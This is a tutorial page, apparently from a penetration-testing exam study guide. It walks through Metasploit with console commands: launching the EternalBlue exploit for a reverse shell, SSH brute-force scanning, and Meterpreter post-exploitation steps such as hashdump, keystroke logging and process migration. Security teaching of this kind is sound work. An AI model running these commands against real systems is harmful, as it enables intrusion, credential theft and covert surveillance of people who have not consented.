# Tutorial: Metasploit — the exploitation framework

**What it is:** a framework of ready-made scanners, exploits, and payloads. On beginner exams you mostly use it for **auxiliary scanners** and one-click exploits for known CVEs.

Quick-start workflow:
```bash
msfconsole                       # start it (slow to load — be patient)
msf6> search eternalblue         # find modules
msf6> use exploit/windows/smb/ms17_010_eternalblue
msf6> show options               # what must be set?
msf6> set RHOSTS 10.0.0.5        # set required options
msf6> set LHOST 10.0.0.99        # your attack box (for reverse shells)
msf6> run                        # or 'exploit'
```

## The 5-step pattern (memorize this — it never changes)
```
search <term>  →  use <module>  →  show options  →  set RHOSTS/LHOST  →  run
```

## Auxiliary scanners (the safe exam use)
```bash
use auxiliary/scanner/portscan/tcp
use auxiliary/scanner/ssh/ssh_version
use auxiliary/scanner/smb/smb_version       # OS/service versions
use auxiliary/scanner/ssh/ssh_login         # USER_FILE + PASS_FILE = hydra-like brute force
```
Set `RHOSTS`, `USER_FILE /usr/share/wordlists/metasploit/unix_users.txt`, etc.

## Meterpreter (post-exploitation shell)
After a successful exploit you often land in **meterpreter**:
```
sysinfo          # who am I on
getuid           # current user
shell            # drop to a raw OS shell
hashdump         # dump Windows password hashes (→ crack with john/hashcat NT)
screenshot, keyscan_start
migrate <pid>    # move into a stable process
exit
```
Background it with `Ctrl+Z`, list with `sessions -l`, re-enter with `sessions -i 1`.

## Gotchas
- `db_nmap -sV 10.0.0.5` = nmap with results stored in msf's database — pair with `vulns`, `services`, `hosts` to review findings.
- Always set **LHOST** to the IP of *your* attack machine for reverse payloads (not 127.0.0.1).
- Matching exploit to target = use your [nmap](01-nmap.md) version output + [searchsploit](13-searchsploit.md).

← [Back to index](../README.md)
